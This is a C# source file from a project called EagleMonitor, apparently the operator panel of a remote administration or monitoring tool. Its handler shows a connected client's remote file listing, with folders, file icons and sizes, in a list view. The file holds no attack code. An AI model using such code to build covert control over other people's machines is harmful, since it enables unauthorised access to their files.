using EagleMonitor.Networking;
using PacketLib.Packet;
using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.PacketParser
{
    internal class FileManagerPacketHandler
    {
        public FileManagerPacketHandler(FileManagerPacket fileManagerPacket, ClientHandler clientHandler)
        {
            /*clientHandler.fileManagerForm.Invoke((MethodInvoker)(() =>
            {
                clientHandler.fileManagerForm.fileListView.Items.Clear();

                ImageList imageList = new ImageList();
                imageList.ColorDepth = ColorDepth.Depth32Bit;
                imageList.ImageSize = new Size(32, 32);
                clientHandler.fileManagerForm.fileListView.LargeImageList = imageList;
                clientHandler.fileManagerForm.fileListView.SmallImageList = imageList;

                int x = 0;

                imageList.Images.Add(x.ToString(),DesyncOps.Properties.Resources.icons8_folder_32);

                foreach (var dir in packet.filesAndDirs[0]) 
                {
                    var listViewItem = clientHandler.fileManagerForm.fileListView.Items.Add(dir[0].ToString());
                    listViewItem.Tag = "FOLDER";
                    listViewItem.Name = dir[0].ToString();
                    listViewItem.ImageKey = x.ToString();
                }

                x++;

                clientHandler.fileManagerForm.fileListView.Sort();

                foreach (var file in packet.filesAndDirs[1]) 
                {
                    Image btm = Utils.Miscellaneous.BytesToImage((byte[])file[1]);
                    imageList.Images.Add(x.ToString(), btm);
                    ListViewItem listViewItem = new ListViewItem(file[0].ToString());
                    listViewItem.SubItems.Add(Utils.Miscellaneous.Numeric2Bytes((long)file[2]));
                    listViewItem.Tag = "FILE";
                    listViewItem.Name = file[0].ToString();
                    listViewItem.ImageKey = x.ToString();
                    clientHandler.fileManagerForm.fileListView.Items.Add(listViewItem);
                    x++;
                }
            }));*/
            new Thread(() =>
            {
                try
                {
                    clientHandler.fileManagerForm.fileListView.BeginInvoke((MethodInvoker)(() =>
                    {
                        clientHandler.fileManagerForm.fileListView.Items.Clear();

                        ImageList imageList = new ImageList
                        {
                            ColorDepth = ColorDepth.Depth32Bit,
                            ImageSize = new Size(32, 32)
                        };
                        clientHandler.fileManagerForm.fileListView.LargeImageList = imageList;
                        clientHandler.fileManagerForm.fileListView.SmallImageList = imageList;

                        int x = 0;

                        imageList.Images.Add(x.ToString(), EagleMonitor.Properties.Resources.icons8_folder_32);

                        foreach (var dir in fileManagerPacket.filesAndDirs[0])
                        {
                            var listViewItem = clientHandler.fileManagerForm.fileListView.Items.Add(dir[0].ToString());
                            listViewItem.Tag = "FOLDER";
                            listViewItem.Name = dir[0].ToString();
                            listViewItem.ImageKey = x.ToString();
                        }

                        x++;

                        clientHandler.fileManagerForm.fileListView.Sort();

                        foreach (var file in fileManagerPacket.filesAndDirs[1])
                        {
                            Image btm = PacketLib.Utils.ImageProcessing.BytesToImage((byte[])file[1]);
                            imageList.Images.Add(x.ToString(), btm);
                            ListViewItem listViewItem = new ListViewItem(file[0].ToString());
                            listViewItem.SubItems.Add(Utils.Miscellaneous.Numeric2Bytes((long)file[2]));
                            listViewItem.Tag = "FILE";
                            listViewItem.Name = file[0].ToString();
                            listViewItem.ImageKey = x.ToString();
                            clientHandler.fileManagerForm.fileListView.Items.Add(listViewItem);
                            x++;
                        }

                        clientHandler.fileManagerForm.loadingCircle1.Visible = false;
                        clientHandler.fileManagerForm.loadingCircle1.Active = false;

                        //fileManagerPacket = null;
                    }));
                    return;
                }
                catch(Exception ex) { MessageBox.Show(ex.ToString()); }
            }).Start();
        }
    }
}
